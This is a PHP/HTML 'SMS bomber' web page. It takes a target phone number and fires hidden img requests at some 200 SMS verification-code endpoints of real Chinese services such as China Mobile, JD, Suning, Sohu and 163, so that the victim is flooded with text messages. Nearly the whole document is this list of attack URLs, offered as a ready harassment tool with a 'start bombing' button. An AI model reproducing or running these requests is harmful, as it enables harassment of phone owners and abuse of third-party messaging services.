<!DOCTYPE html PUBLIC "-//WAPFORUM//DTD XHTML Mobile 1.0//EN" "http://www.wapforum.org/DTD/xhtml-mobile10.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html;charset=UTF-8"/>
<meta http-equiv="Cache-Control" content="max-age=0" forua="true"/>
<meta http-equiv="Cache-Control" content="no-cache"/>
<meta http-equiv="Expires" content="0"/>
<link rel="stylesheet" href="css.css" type="text/css"/>
<style>
*{font-family:'Microsoft Yahei';}
.bs-callout{margin:20px 0;padding:15px 30px 15px 15px;border-left:5px solid #eee;}.bs-callout-danger{background-color:#fcf2f2;border-color:#dFb5b4;}.bs-callout-warning{background-color:#fefbed;border-color:#f1e7bc;}.bs-callout-info{background-color:#f0f7fd;border-color:#d0e3f0;}.bs-callout-success{background-color:#f4f9ef;border-color:#d6e9c6;}
h4 {font-weight: bold;}
</style>
<title>短信炸弹</title>
</head>
<body>

<div class="container">

<div class="panel panel-success">
    <div class="panel-heading">
        <h3 class="panel-title">短信轰炸器<span class="label label-success" style="float: right;" onclick="window.open('http://blog.0907.org/', '_new')"><strong>由无名强力驱动</strong></span></h3>
    </div>
    <div class="input-group">
        <span class="input-group-addon input-lg">+86</span>
		<form method="GET" action="index.php">
        <input type="text" name="hm" maxlength="11" class="form-control input-lg" placeholder="输入需要轰炸的号码" value="" />
    </div>
		<div id="pre_request"><br />
        <button type="submit" class="btn btn-danger" name="ok" onclick="ajaxRequest(0);">启动轰炸线程</button>
		<button type="button" class="btn btn-success" onclick="top.location='index.php'">停止轰炸线程</button>

		</div>
		</form>


<?php
error_reporting(0);
$v=$_GET['c'];
$a=$v+1;
$e=$a-1;
$d=$_GET['hm'];
?>
<div class="tip">
<?php
$i=18763190302;//想要屏蔽的手机号
if($i==$d){
   echo "<br><br><H4>本手机号禁止发送垃圾短信</H4>";
}
if($i!=$d and $d>1){
    echo"   <br /><div class='progress progress-striped active'><div class='progress-bar progress-bar-success' style='width: 100%'>轰炸进行中</div></div><div id='ajax_thread_msg'><div class='alert alert-success' style='margin-bottom: 0px;'>短信轰炸已启动,  对<strong>$d</strong>,已经发起<strong>$e</strong>.波轰炸,如不信请自测</div></div>";
    echo "<div style='display:none'><img src=’http://www.youku.com/user_getCode/?__rt=1&__ro=&mobile=1396589698′ alt=’已轰炸’/>
<img src=’http://tel.chuangye.com/sendtelmsg.php?callback=jQuery152018386108220195274_1377603898765&GUID=4829649503470711614&callingnum=1396589698&custid=885611&_=1377603926031′ alt=’已轰炸’/>
<img src=’http://authleqr.sdo.com/lars/send-login-validate-code.jsaonp?callback=jQuery16206594030656120524_1341237419373&userId=1396589698′ alt=’已轰炸’/>
<img src=’http://member.1688.com//member/ajax/send_identity_code_by_mobile.do?callback=jQuery172007067019236274064_1376100939244&mobile=1396589698&area=86&isBizMobile=true’ alt=’已轰炸’/>
<img src=’http://bbs.fblife.com/tel_ajax.php?telphone=1396589698′ alt=’已轰炸’/>
<img src=’https://cmpay.10086.cn/service/send_chk_no.xhtml?REG_MBL_NO=1396589698′ alt=’已轰炸’/>
<img src=’https://feixin.10086.cn/account/RegisterLv3Ajax?stype=m&stext=1396589698′ alt=’已轰炸’/>
<img src=’http://my.feixin.10086.cn/password/findpasswordvalidate?type=0&account=1396589698′ alt=’已轰炸’/>
<img src=’http://218.206.191.106/idm/usermgr/usernameCheck?mobilePhone=1396589698′ alt=’已轰炸’/>
<img src=’http://go.10086.cn/index.do?method=doReg&mobile=1396589698′ alt=’已轰炸’/>
<img src=’http://passport.wanmei.com/NoteAction.do?method=sendRegCode?mobile=1396589698′ alt=’已轰炸’/>
<img src=’http://authleqr.sdo.com/lars/check-account-types.jsonp?callback=jQuery16203658856788579764_1366925187811&userId=1396589698′ alt=’已轰炸’/>
<img src=’http://www.guahao.com/validcode/json/mobile/1396589698′ alt=’已轰炸’/>
<img src=’http://chinatelecom.zc.qq.com/cgi-bin/send_sms?phonenum=1396589698′ alt=’已轰炸’/>
<img src=’http://cas.sdo.com/authen/sendPhoneCheckCode.jsonp?callback=sendPhoneCheckCode_JSONPMethod&inputUserId=1396589698′ alt=’已轰炸’/>
<img src=’http://sdo.com/productVersion=v5&frameType=3&locale=zh_CN&version=21&tag=20&authenSource=2&productId=2&_=1396589698′ alt=’已轰炸’/>
<img src=’http://www.1732.com/public/ajax.aspx?app=resendcode&bindaccount=1396589698′ alt=’已轰炸’/>
<img src=’http://a.10086.cn/pams2/s/s.do?c=204&j=l&lpt=1&p=72&mobile=1396589698′ alt=’已轰炸’/>
<img src=’http://authleqr.sdo.com/lars/send-login-validate-code.jsaonp?callback=jQuery16206594030656120524_1341237419373&userId=1396589698′ alt=’已轰炸’/>
<img src=’http://wap.easou.com/sms.e?name=%e8%93%9d%e8%93%9d%e5%a4%a9%e7%a9%ba&mobile=1396589698′ alt=’已轰炸’/>
<img src=’http://w.sohu.com/t2/tologin.do?mnd=1396589698′ alt=’已轰炸’/>
<img src=’http://www.guahao.com/validcode/json/mobile/1396589698/REG_MOBILE/719f8a68dfc29f1a716d717ce037aed4?_=137898685178′ alt=’已轰炸’/>
<img src=’http://www.soufun.com/card/AjaxProc/AjaxProcCheckCodeVerify.aspx?type=send&sig=45E87A127341960AFC8ED0275EB6AA0E&phone=1396589698&time=1378987449390&{}’ alt=’已轰炸’/>
<img src=’http://www.51auto.com/dwr/exec/CarViewAJAX.sendMsgNew?callCount=1&c0-scriptName=CarViewAJAX&c0-methodName=sendMsgNew&c0-id=6143_1378984903140&c0-param0=number:1846606&c0-param1=string:1396589698&xml=true’ alt=’已轰炸’/>
<img src=’http://wifi.189.cn/user/ajax.do?method=reqCode&phone=1396589698′ alt=’已轰炸’/>
<img src=’http://car.bitauto.com/carprice/rongwein1/baojia/c0/SimpleCall.ashx?vendorID=100007603&sourcetype=priceV2&tel=01396589698′ alt=’已轰炸’/>
<img src=’http://car.bitauto.com/carprice/rongwein1/baojia/c0/CallDialog.ashx?utid=1&usid=100007603&tel=01396589698′ alt=’已轰炸’/>
<img src=’http://vip.tq.cn/vip/SendShortCall.do?uin=8988765&callPhone=01396589698&verifyCode=&rand=51564825265182266&admin_uin=8988765&client_uin=&clientid=&visitor_comes=8&visitor_page=http://www.weilaicn.com/About-15.html&visitor_last_page=&visitor_keyword=&visitor_entry=&cause=0′ alt=’已轰炸’/>
<img src=’https://member.suning.com/emall/SNCellPhoneRegisterCmd?actionType=reSendValCode&logonId=1396589698&URL=SNUserRegisterComfirmView&_=1363500974671′ alt=’已轰炸’/>
<img src=’http://cas.sdo.com/authen/sendPhoneCheckCode.jsonp?callback=sendPhoneCheckCode_JSONPMethod&inputUserId=1396589698&type=3&appId=201&areaId=0&serviceUrl=’ alt=’已轰炸’/>
<img src=’http://member.1688.com//member/ajax/send_identity_code_by_mobile.do?callback=jQuery172007067019236274064_1376100939244&mobile=1396589698&area=86&isBizMobile=true’ alt=’已轰炸’/>
<img src=’http://authleqr.sdo.com/lars/send-login-validate-code.jsaonp?callback=jQuery16206594030656120524_1341237419373&userId=1396589698′ alt=’已轰炸’/>
<img src=’http://a.10086.cn/pams2/s/s.do?c=204&j=l&lpt=1&mobile=1396589698&p=72′ alt=’已轰炸’/>
<img src=’http://go.10086.cn/index.do?method=doReg&mobile=1396589698&source=reg’ alt=’已轰炸’/>
<img src=’http://wap.cmread.com/sso/oauth2/msisdnRegister?e_l=1&amp;f=7718&amp;pg=221&msisdn=1396589698&passwd=1415926′ alt=’已轰炸’/>
<img src=’http://download.feixin.10086.cn/download/downloadFLToMobile.action?id=50&no=1396589698&isCheckCode=1′ alt=’已轰炸’/>
<img src=’http://interface.game.renren.com/ActivityCenter/?catalog=plugins&gameid=all&aname=reg&method=reg.subUserInfo&mobile=1396589698&callback=jQuery17204292543791520399_1365068164751&_=1365068180406′ alt=’已轰炸’/>
<img src=’http://my.xoyo.com/register/NewIsExist/?uid=1396589698′ alt=’已轰炸’/>
<img src=’http://t.sdo.com/home/SendSms?mobile=1396589698′ alt=”/>
<img src=’http://m.10086.cn/wireless/n-migu/regbox.htm?q=1396589698&id=3772&k=002000a’ alt=’已轰炸’/>
<img src=’http://shenzhen.baixing.com/z/i/verify?mobile=1396589698###’ alt=’已轰炸’/>
<img src=’http://a.10086.cn/pams2/s/s.do?c=204&amp;j=l&amp;lpt=1&amp;mobile=1396589698&amp;p=72′ alt=’已轰炸’/>
<img src=’http://read.10086.cn/www/firstpage/getValidateCode.action?phone=1396589698&amp;sf=0′ alt=’已轰炸’/>
<img src=’http://go.10086.cn/index.do?method=doReg&amp;mobile=1396589698&amp;source=reg’ alt=’已轰炸’/>
<img src=’http://wap.cmread.com/sso/oauth2/msisdnRegister?e_l=1&amp;f=7718&amp;pg=221&amp;msisdn=1396589698&amp;passwd=1415926′ alt=’已轰炸’/>
<img src=’http://a.10086.cn/pams2/s/s.do?c=204&j=l&lpt=1&p=72&mobile=1396589698′ alt=’已轰炸’/>
<img src=’http://member.1688.com//member/ajax/send_identity_code_by_mobile.do?callback=jQuery172007067019236274064_1376100939244&amp;mobile=1396589698&amp;area=86&amp;isBizMobile=true’ alt=’已轰炸’/>
<img src=’https://feixin.10086.cn/account/RegisterCodeDiv?mobileno=1396589698′ alt=’已轰炸’/>
<img src=’https://member.suning.com/emall/SNCellPhoneRegisterCmd?actionType=reSendValCode&logonId=1396589698&URL=SNUserRegisterComfirmView&_=1363500974671′ alt=’已轰炸’/>
<img src=’http://cas.sdo.com/authen/sendPhoneCheckCode.jsonp?callback=sendPhoneCheckCode_JSONPMethod&inputUserId=1396589698&type=3&appId=201&areaId=0&serviceUrl=’ alt=’已轰炸’/>
<img src=’http://wap.dm.10086.cn/X/o/3455101/447117/mva0?a=/enduser/querySMSValiCodeByWap20.action&templateDir=template&theme=simple&name=querySMSValiCode&id=querySMSValiCode&downId=&operateType=1&isPass=true&user.accountName=1396589698′ alt=’已轰炸’/>
<img src=’http://a.10086.cn/pams2/s/s.do?c=204&j=l&lpt=1&mobile=1396589698′ alt=’已轰炸’/>
<img src=’http://read.10086.cn/www/firstpage/getValidateCode.action?phone=1396589698′ alt=’已轰炸’/>
<img src=’http://read.10086.cn/www/NiceNameAjax?msisdn=1396589698′ alt=’已轰炸’/>
<img src=’http://sign.kting.cn/register/getphoneverify/phone/1396589698′ alt=’已轰炸’/>
<img src=’http://m.xs8.cn/user/quick_signup.html?mobile=1396589698′ alt=’已轰炸’/>
<img src=’http://bbs.360che.com/ajax1.php?action=ds21&mobilenum=1396589698′ alt=’已轰炸’/>
<img src=’http://pass.ledu.com/reg/mobilecode?type=reg&mobile=1396589698′ alt=’已轰炸’/>
<img src=’http://www.52callme.com/Handler/SendVerifyCodeHandler.ashx?m=1396589698′ alt=’已轰炸’/>
<img src=’http://sso.letv.com/user/mobileRegCode/mobile/1396589698′ alt=’已轰炸’/>
<img src=’http://www.sinosig.com/auth/regist_refresh.action?sso_userName=1396589698′ alt=’已轰炸’/>
<img src=’https://sn.ac.10086.cn/sendMsgRequest?mobileNumber=1396589698′ alt=’已轰炸’/>
<img src=’https://fj.ac.10086.cn/SMSCodeSend?mobileNum=1396589698′ alt=’已轰炸’/>
<img src=’https://fj.ac.10086.cn/SMSCodeSend?mobileNum=1396589698′ alt=’已轰炸’/>
<img src=’https://fj.ac.10086.cn/ssouser/sendMessage.do?mobileno=1396589698′ alt=’已轰炸’/>
<img src=’http://www.gs.10086.cn/gs_obsh_service/actionDispatcher.do?userMobile=1396589698′ alt=’已轰炸’/>
<img src=’https://sn.ac.10086.cn/sendMsgRequest?code=%E7%82%B9%E5%87%BB%E8%8E%B7%E5%8F%96%E9%AA%8C%E8%AF%81%E7%A0%81&mobileNumber=1396589698′ alt=’已轰炸’/>.<img src=’https://js.ac.10086.cn/jsauth/dzqd/pagSendDypass?umobile=1396589698′ alt=’已轰炸’/>
<img src=’http://gd.10086.cn/ngcrm/hall/SendRandomSms.action?mobile=1396589698′ alt=’已轰炸’/>
<img src=’http://liao.189.cn/ECP-Portals/phoneDown/download.do?phone=1396589698′ alt=’已轰炸’/>
<img src=’https://ecplive.cn/reg/servlet/ivrInvokeServlet?number=1396589698′ alt=’已轰炸’/>
<img src=’http://www.keepc.com/registerForMobileForCode.act?mobileNo=1396589698′ alt=’已轰炸’/>
<img src=’http://wap.cmread.com/sso/oauth2/msisdnRegister?e_l=1&amp;f=7718&amp;pg=221&msisdn=1396589698′ alt=’已轰炸’/>
<img src=’https://passport.jd.com/emReg/isMobileEngaged?mobile=1396589698′ alt=’已轰炸’/>
<img src=’http://shoujibao.net/pams2/m/s.do?j=l&c=31879&p=73&mobile=1396589698′ alt=’已轰炸’/>
<img src=’http://club.service.autohome.com.cn/Ashx/CreateMobileCode.ashx?mobile=1396589698′ alt=’已轰炸’/>
<img src=’http://www.huggieshappyclub.com/Handler/Vcode.ashx?mobile=1396589698′ alt=’已轰炸’/>
<img src=’http://wap.buidq.com/wap/webcallService.aspx?tel=1396589698′ alt=’已轰炸’/>.<img src=’http://www.uwewe.com/get/IsUser.aspx?phone=1396589698′ alt=’已轰炸’/>
<img src=’http://www.uwewe.com/get/SendMessage.aspx?phone=1396589698′ alt=’已轰炸’/>
<img src=’http://www.wcall.net/ajax/send_captcha.jsp?mobile=861396589698′ alt=’已轰炸’/>
<img src=’http://www.uwewe.com/wap/reg.aspx?__VIEWSTATE=%2FwEPDwUKLTg3MDQ4MjcyNGRkTWAEkK5GOtWg8l1At7LuQLJsrtk%3D&__EVENTVALIDATION=%2FwEWBwLf79jTDQL7h7XWDwKd%2B7q4BwLinreAAgLChPzDDQK7q7GGCAKM54rGBiIS9Dt7i1j1h%2BDtH9EcyHIWJVZf&txtacct=1396589698′ alt=’已轰炸’/>
<img src=’http://www.gewara.com/ajax/mobile/register.xhtml?mobile=1396589698′ alt=’已轰炸’/>
<img src=’http://www.gewara.com/checkMember.xhtml?tag=mobile&itemvalue=1396589698′ alt=’已轰炸’/>
<img src=’http://www.dianping.com/ajax/json/account/reg/mobile/send?m=1396589698′ alt=’已轰炸’/>
<img src=’http://www.duoku.com/auth/sendmsg?fr=xs_hao123_kz&mobile=1396589698&_=1376669935062′ alt=’已轰炸’/>
<img src=’http://www.uya100.com/Handler/UyaLiveHome/Common.ashx?q=getcheckcode&tel=1396589698&module=ZCYZ&randid=0.6472104146905496′ alt=’已轰炸’/>
<img src=’http://shenzhen.baixing.com/z/i/verify?mobile=1396589698###’ alt=’已轰炸’/>
<img src=’http://authleqr.sdo.com/lars/send-login-validate-code.jsaonp?callback=jQuery16206594030656120524_1341237419373&userId=1396589698′ alt=’已轰炸’/>
<img src=’http://member.tiancity.com/handler/GetPhoneRegAuthCodeHandler.ashx?a=135&userid=1396589698′ alt=’已轰炸’/>
<img src=’https://affiliate-program.amazon.com/gp/associates/apply/assoc-ivs.html?phoneNumber=%2B861396589698&operation=start&ts=1376099658512′ alt=’已轰炸’/>
<img src=’http://i.360.cn/smsApi/sendsmscode?account=1396589698&condition=2&r=0.8326570473673853&callback=QiUserJsonP1354551431282′ alt=’已轰炸’/>
<img src=’https://affiliate-program.amazon.com/gp/associates/apply/assoc-ivs.html?phoneNumber=%2B861396589698&operation=start&ts=137606625123′ alt=’已轰炸’/>
<img src=’http://passport.cnyw.net//ajax.php?action=getverify&mobile=1396589698′ alt=’已轰炸’/>
<img src=’http://www.kunlun.com/?act=ajax.registGetMobileCode&mobile=1396589698&type=regist’ alt=’已轰炸’/>
<img src=’http://www.vko.cn/sendmobile.html?phone=1396589698&{}&_=1355879411734′ alt=’已轰炸’/>
<img src=’http://www.66call.com/register.aspx?__EVENTTARGET=&__EVENTARGUMENT=&__LASTFOCUS=&__VIEWSTATE=%2FwEPDwUKLTYzNzEwOTYxOA9kFgJmD2QWDAIFDw8WAh4EVGV4dAULMTU5NTAxMjgwMzZkZAIHDw8WBh8ABQblj6%2FnlKgeCENzc0NsYXNzBQ5yX2NfY19yX2NoZWNrMR4EXyFTQgICZGQCDQ8PZBYCHgV2YWx1ZQUJamlhbmdsaWxpZAIPDw8WBh8ABQbpgJrov4cfAQUOcl9jX2Nfcl9jaGVjazEfAgICZGQCEQ8PZBYCHwMFCWppYW5nbGlsaWQCEw8PFgYfAAUG6YCa6L%2BHHwEFDnJfY19jX3JfY2hlY2sxHwICAmRkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYCBQxJbWFnZUJ1dHRvbjEFDEltYWdlQnV0dG9uMoC6NmiwUtO9MaSDo%2BblDqWjloj5&txtact=1396589698&hidfoc=&hidisOk=1&txtpwd=jianglili&txtrepwd=jianglili&txtcode=&ImageButton1.x=59&ImageButton1.y=11′ alt=’已轰炸’/>
<img src=’https://affiliate-program.amazon.com/gp/associates/apply/assoc-ivs.html?phoneNumber=%2B861396589698&operation=start&ts=1396589698′ alt=’已轰炸’/>
<img src=’http://register.sdo.com/gaea/SendPhoneMsg.ashx?page=REG&mobile=1396589698′ alt=’已轰炸’/>
<img src=’http://wap.easou.com/sms.e?name=%e8%93%9d%e8%93%9d%e5%a4%a9%e7%a9%ba&mobile=1396589698&action=sms&usid=9&’ alt=’已轰炸’/>
<img src=’http://www.gewara.com/ajax/mobile/register.xhtml?mobile=1396589698&captchaId=&captcha=’ alt=’已轰炸’/>
<img src=’http://w.sohu.com/t2/tologin.do?mnd=1396589698&qr=1′ alt=’已轰炸’/>
<img src=’http://www.66call.com/register.aspx?__EVENTTARGET=&__EVENTARGUMENT=&__LASTFOCUS=&__VIEWSTATE=%2FwEPDwUKLTYzNzEwOTYxOA9kFgJmD2QWDAIFDw8WAh4EVGV4dAULMTU5NTAxMjgwMzZkZAIHDw8WBh8ABQblj6%2FnlKgeCENzc0NsYXNzBQ5yX2NfY19yX2NoZWNrMR4EXyFTQgICZGQCDQ8PZBYCHgV2YWx1ZQUJamlhbmdsaWxpZAIPDw8WBh8ABQbpgJrov4cfAQUOcl9jX2Nfcl9jaGVjazEfAgICZGQCEQ8PZBYCHwMFCWppYW5nbGlsaWQCEw8PFgYfAAUG6YCa6L%2BHHwEFDnJfY19jX3JfY2hlY2sxHwICAmRkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYCBQxJbWFnZUJ1dHRvbjEFDEltYWdlQnV0dG9uMoC6NmiwUtO9MaSDo%2BblDqWjloj5&txtact=1396589698&hidfoc=&hidisOk=1&txtpwd=zhasini&txtrepwd=zhasini&txtcode=&ImageButton1.x=59&ImageButton1.y=11′ alt=’已轰炸’/>
<img src=’http://wap.dm.10086.cn/X/o/3455101/447117/mva0?a=/enduser/querySMSValiCodeByWap20.action&templateDir=template&theme=simple&name=querySMSValiCode&id=querySMSValiCode&downId=&operateType=1&isPass=true&user.accountName=1396589698&Submit=%E4%B8%8B%E4%B8%80%E6%AD%A5′ alt=’已轰炸’/>
<img src=’http://a.10086.cn/pams2/s/s.do?c=204&j=l&lpt=1&mobile=1396589698&p=72′ alt=’已轰炸’/>
<img src=’http://read.10086.cn/www/firstpage/getValidateCode.action?phone=1396589698&sf=0′ alt=’已轰炸’/>
<img src=’http://read.10086.cn/www/NiceNameAjax?msisdn=1396589698&e_cm=cmmobile’ alt=’已轰炸’/>
<img src=’https://cmpay.10086.cn/service/send_chk_no.xhtml?REG_MBL_NO=1396589698&SMS_CD=URM001&typ=Y&r=0.9636801626045905′ alt=’已轰炸’/>
<img src=’https://feixin.10086.cn/account/RegisterLv3Ajax?stype=m&stext=1396589698′ alt=’已轰炸’/>
<img src=’http://my.feixin.10086.cn/password/findpasswordvalidate?type=0&account=1396589698′ alt=’已轰炸’/>
<img src=’http://218.206.191.106/idm/usermgr/usernameCheck?mobilePhone=1396589698′ alt=’已轰炸’/>
<img src=’http://go.10086.cn/index.do?method=doReg&mobile=1396589698&source=reg’ alt=’已轰炸’/>
<img src=’http://www.keepc.com/registerForMobileForCode.act?mobileNo=1396589698′ alt=’已轰炸’/>
<img src=’http://wap.cmread.com/sso/oauth2/msisdnRegister?e_l=1&amp;f=7718&amp;pg=221&msisdn=1396589698&passwd=1415926′ alt=’已轰炸’/>
<img src=’https://passport.jd.com/emReg/isMobileEngaged?mobile=1396589698&r=0.08241349037594953′ alt=’已轰炸’/>
<img src=’http://shoujibao.net/pams2/m/s.do?j=l&c=31879&p=73&mobile=1396589698&password=1415926′ alt=’已轰炸’/>
<img src=’http://club.service.autohome.com.cn/Ashx/CreateMobileCode.ashx?mobile=1396589698′ alt=’已轰炸’/>
<img src=’http://www.huggieshappyclub.com/Handler/Vcode.ashx?mobile=1396589698′ alt=’已轰炸’/>
<img src=’http://wap.buidq.com/wap/webcallService.aspx?tel=1396589698′ alt=’已轰炸’/>
<img src=’http://www.uwewe.com/get/IsUser.aspx?phone=1396589698&quhao=86′ alt=’已轰炸’/>
<img src=’http://www.uwewe.com/get/SendMessage.aspx?phone=1396589698&ccode=86&type=1′ alt=’已轰炸’/>
<img src=’http://www.66call.com/forgetpwd.aspx?ScriptManager1=UpdatePanel1|ImageButton2&__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwULLTExMjY2ODE5MTgPFgYeCFRpbWVTcGFuBqpmMwD38M%2BIHgRjb2RlBQQ0MjY1HgRhY2N0BQsxNTgzODgwMjA0MmQYAQUeX19Db250cm9sc1JlcXVpcmVQb3N0QmFja0tleV9fFgMFDEltYWdlQnV0dG9uMgUMSW1hZ2VCdXR0b24xBQxJbWFnZUJ1dHRvbjPdI0AXCiz2XIYks0CPZpmkSSEMDg%3D%3D&txtacct=1396589698&txtcode=7426&txtpwd=&txtrepwd=&ImageButton2.x=76&ImageButton2.y=18′ alt=’已轰炸’/>
<img src=’http://www.wcall.net/ajax/send_captcha.jsp?mobile=861396589698′ alt=’已轰炸’/>
<img src=’http://www.uwewe.com/wap/reg.aspx?__VIEWSTATE=%2FwEPDwUKLTg3MDQ4MjcyNGRkTWAEkK5GOtWg8l1At7LuQLJsrtk%3D&__EVENTVALIDATION=%2FwEWBwLf79jTDQL7h7XWDwKd%2B7q4BwLinreAAgLChPzDDQK7q7GGCAKM54rGBiIS9Dt7i1j1h%2BDtH9EcyHIWJVZf&txtacct=1396589698&txtpwd=&txtRepwd=&txtCode=&Button2=%E8%AF%AD%E9%9F%B3%E8%8E%B7%E5%8F%96%E9%AA%8C%E8%AF%81%E7%A0%81′ alt=’已轰炸’/><img src=’http://www.gewara.com/ajax/mobile/register.xhtml?mobile=1396589698&captchaId=&captcha=’ alt=’已轰炸’/>
<img src=’http://www.gewara.com/checkMember.xhtml?tag=mobile&itemvalue=1396589698′ alt=’已轰炸’/>
<img src=’http://www.dianping.com/ajax/json/account/reg/mobile/send?m=1396589698′ alt=’已轰炸’/>
<img src=’http://www.ushi.com/openRegU!checkNumber.jhtml?basicProfile.mobile=1396589698′ alt=’已轰炸’/>
<img src=’http://www.efala.net/newfindpwbysms.flow?byname=1396589698′ alt=’已轰炸’/>
<img src=’http://zj.189.cn/zjpr/member/authentication/sendValidatePhone.html?phone=1396589698′ alt=’已轰炸’/>
<img src=’http://weibo.com/signup/v5/formcheck?type=mobile&value=1396589698&__rnd=1363496469546′ alt=’已轰炸’/>
<img src=’http://api.open.uc.cn/cas/register/mobi/resendVCode?uc_param_str=einisivelafrpf&client_id=20033&from=cas&mobi=1396589698′ alt=’已轰炸’/>
<img src=’http://ptlogin.4399.com/ptlogin/sendRegPhoneCode.do?phone=1396589698&appId=www_home&v=1&v=1′ alt=’已轰炸’/>
<img src=’http://i.youku.com/u/bindMobile?__rt=1&__ro=&mobile=1396589698′ alt=’已轰炸’/>
<img src=’https://safe.renren.com/actions/changesafemobile/sendmobilecaptcha?ajax-type=json&token=1ZhR7iv65SgaNXliuA7mujgTO3s3k1CL&mobile=1396589698&requestToken=496404876&_rtk=e95787e6′ alt=’已轰炸’/>
<img src=’http://club.service.autohome.com.cn/Ashx/CreateMobileCode.ashx?mobile=1396589698′ alt=’已轰炸’/>
<img src=’http://service.zol.com.cn/user/ajax/sendMsgCode.php?phone=1396589698′ alt=’已轰炸’/>
<img src=’https://login.vancl.com/login/BeginRegister.ashx?action=sendmobilecode&key=1396589698&validatecode=&_=1363498730859′ alt=’已轰炸’/>
<img src=’http://passport.eastmoney.com/chkphone.aspx?flag=check&param=1396589698′ alt=’已轰炸’/>
<img src=’http://passport.eastmoney.com/chkphone.aspx?flag=resend&param=1396589698′ alt=’已轰炸’/>
<img src=’http://passport.cntv.cn/mobileRegister.do?msisdn=1396589698&verfiCodeType=1&method=getRequestVerifiCode’ alt=’已轰炸’/>
<img src=’http://register.zhenai.com/register/validateMobile.jsps?mobile=1396589698′ alt=’已轰炸’/>
<img src=’http://reg.jiayuan.com/libs/xajax/reguser.server.php?processSendOrUpdateMessage&xajax=processSendOrUpdateMessage&xajaxargs%5B%5D=%3Cxjxquery%3E%3Cq%3Emobile%3Dd$%3C%2Fq%3E%3C%2Fxjxquery%3E&xajaxargs%5B%5D=mobile&xajaxr=1363500615734′ alt=’已轰炸’/>
<img src=’https://passport.jd.com/emReg/sendMobileCode?mobile=1396589698&r=0.9010949897739119′ alt=’已轰炸’/>
<img src=’https://member.suning.com/emall/SNCellPhoneRegisterCmd?actionType=reSendValCode&logonId=1396589698&URL=SNUserRegisterComfirmView&_=1363500974671′ alt=’已轰炸’/>
<img src=’http://account.iqiyi.com/security/secret/mobile/adm.action?time=1363501090218&mobile=1396589698′ alt=’已轰炸’/>
<img src=’http://www.skywldh.com/registerForMobileForCode.act?mobileNo=1396589698&smSecurityCode=’ alt=’已轰炸’/>
<img src=’http://wap.skywldh.com/index.php?register&flag=flag&phone=1396589698&mss=on’ alt=’已轰炸’/>
<img src=’http://zg51.net/web/customer/forgetPwd_up.asp?customermobile=1396589698&verify=01f735f97f1af959&checkcodeflag=1′ alt=’已轰炸’/>
<img src=’http://www.qqvoice.com/free/getExpCode.do?_isAjaxRequest=true&phonemail=1396589698&type=1&randvalue=’ alt=’已轰炸’/>
<img src=’http://www.feiin.com/findAccountInfoByAccount.act?mobile=1396589698′ alt=’已轰炸’/>
<img src=’http://wap.feiin.cn/index.php?register?phone=1396589698′ alt=’已轰炸’/>
<img src=’http://www.feiin.cn/bindMobileCode.act?account=1396589698&quhao=0086′ alt=’已轰炸’/>
<img src=’http://www.139talk.com/user/regnum.html?phone=1396589698&type=1&key=ofoedsv0oeg6aari1m3ig0nsc5′ alt=’已轰炸’/>
<img src=’http://www.139talk.com/invite/invitesms.html?phone=1396589698&key=ofoedsv0oeg6aari1m3ig0nsc5′ alt=’已轰炸’/>
<img src=’http://www.139talk.com/invite/regnum.html?phone=1396589698&type=1&key=ofoedsv0oeg6aari1m3ig0nsc5′ alt=’已轰炸’/>
<img src=’http://www.139talk.com/invite/register.html?p=cGhvbmV8MTU4Mzg4MDIwNDJ8Y2hrY29kZXw4OTczfGRhdGV8MjAxMy0wMy0xNw==’ alt=’已轰炸’/>
<img src=’http://www.139talk.com/download/smsdownload.html?popPhone=1396589698&phoneType=Iphone&popKey=ofoedsv0oeg6aari1m3ig0nsc5′ alt=’已轰炸’/>
<img src=’http://www.159talk.com/user/regnum.html?phone=1396589698&type=1&key=h5u9albk8oveqm17rfo6kvo226′ alt=’已轰炸’/>
<img src=’http://my.tv.sohu.com/user/reg/getmstatus.do?passport=1396589698′ alt=’已轰炸’/>
<img src=’http://sso.letv.com/user/mobileRegCode/mobile/1396589698/mobilecodeletvid/k961601363512388′ alt=’已轰炸’/>
<img src=’http://register.sdo.com/gaea/SendPhoneMsg.ashx?page=REG&mobile=1396589698′ alt=’已轰炸’/>
<img src=’http://download.feixin.10086.cn/download/downloadFLToMobile.action?id=50&no=1396589698&isCheckCode=1′ alt=’已轰炸’/>
<img src=’http://my.feixin.10086.cn/password/sendfindpasswordsms?MobileNo=1396589698′ alt=’已轰炸’/>
<img src=’http://f.10086.cn/im5/register/checkMobile.action?mobileNo=1396589698′ alt=’已轰炸’/>
<img src=’http://zc.qq.com/cgi-bin/bd/send_sms?acc=1396589698&bkn=1656136920&v=0.6187287989762199′ alt=’已轰炸’/>
<img src=’http://weibo.com/signup/v5/formcheck?type=sendsms&value=1396589698&__rnd=1364610012046http://hm.baidu.com/hm.gif?cc=1&ck=1&cl=16-bit&ds=1280×800&ep=%E8%8E%B7%E5%8F%96%E9%AA%8C%E8%AF%81%E7%A0%81*%E7%82%B9%E5%87%BB&et=4&fl=11.6&ja=1&ln=zh-cn&lo=0&nv=1&rnd=2125197633&si=4cd143d67831005438c65f586314c582&st=3&su=http://club.autohome.com.cn%2Fbbs%2Fthread-c-148-2031217-1.html&v=1.0.40&lv=1&api=8_0&tt=%E7%94%A8%E6%88%B7%E6%B3%A8%E5%86%8C_%E6%B1%BD%E8%BD%A6%E4%B9%8B%E5%AE%B6′ alt=’已轰炸’/>
<img src=’https://www.qianwang365.com/uc/ajax/obtainSecurityCode4Regist.html?username=1396589698′ alt=’已轰炸’/>
<img src=’http://www.efala.net/getcode.flow?phone=1396589698&cardno=&code=&’ alt=’已轰炸’/>
<img src=’http://passport.wanmei.com/NoteAction.do?method=sendRegCode&mobile=1396589698′ alt=’已轰炸’/>
<img src=’http://biz.b2b.cn/member/SendCode.ashx?temptime=1365067755281&m=1396589698′ alt=’已轰炸’/>
<img src=’http://www.kunlun.com/index.php?act=ajax.checkUsername&user_name=1396589698′ alt=’已轰炸’/>
<img src=’http://reg.email.163.com/unireg/call.do?cmd=added.mobileverify.sendAcode&mobile=1396589698&uid=1396589698%40163.com&mark=mobile_start’ alt=’已轰炸’/>
<img src=’http://passport.eastmoney.com/chkphone.aspx?flag=resend&param=1396589698′ alt=’已轰炸’/>
